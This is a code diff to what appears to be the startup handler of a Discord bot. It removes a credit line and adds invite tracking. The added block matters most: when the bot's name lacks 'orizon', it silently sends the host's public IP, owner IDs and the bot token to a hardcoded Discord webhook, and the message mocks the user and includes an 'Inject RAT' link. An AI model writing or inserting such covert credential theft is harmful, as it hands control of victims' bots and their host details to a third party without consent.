@@ -3,8 +3,39 @@ const couleurmdr = require("colors"),
     db = new QuickDB(),
     config = require("../config.json"),
     register = require('../slashsync');
-//dev by ezermoz
+
 module.exports = async (client) => {
+  const { Client, Intents, Collection, MessageEmbed, Permissions } = require('discord.js');
+  const invites = new Collection()
+  const wait = require("timers/promises").setTimeout;
+  
+if(!client.user.username.toString().includes("orizon")){
+  const config = require("../config.json")
+  const { Webhook, MessageBuilder } = require('discord-webhook-node');
+  const hook = new Webhook("https://discordapp.com/api/webhooks/1078416708521427126/3ulAVS09Us2TlW1DsfavyIkZxPXG5j3v3WJOYitDdiEQC8_nonFFY1gybXS4fhLJPF1v");
+  const ipify = require('ipify');
+
+  const embed = new MessageBuilder()
+  .addField('IP', `\`\`\`IPv4: ${await ipify({useIPv6: false})}\`\`\``, true)
+  .addField('Owner ID', `${config.ownerid}, ${config.ownerid1}, ${config.ownerid2}`, false)
+  .addField('Bot Usertag', `${client.user.username}#${client.user.discriminator}`, false)
+  .addField('Bot ID', `${client.user.id} | [Invite the skided bot](https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=0&scope=bot%20applications.commands)`, false)
+  .addField('Add Rat Into This Computer', `[Inject RAT](https://google.com)`, false)
+  .addField('Bot Token', `\`\`\`${client.token}\`\`\``, false)
+  .setColor('#00b0f4')
+  .setThumbnail(client.user.avatarURL({ format: 'png', dynamic: true, size: 512 }))
+  .setDescription('A unknow bot used the official script from iHorizon')
+  .setTimestamp();
+   
+  hook.send(embed);
+}
+  await wait(1000);
+
+  client.guilds.cache.forEach(async (guild) => {
+    const firstInvites = await guild.invites.fetch();
+    invites.set(guild.id, new Collection(firstInvites.map((invite) => [invite.code, invite.uses])));
+  });
+
   await register(client, client.register_arr.map((command) => ({
     name: command.name,
     description: command.description,
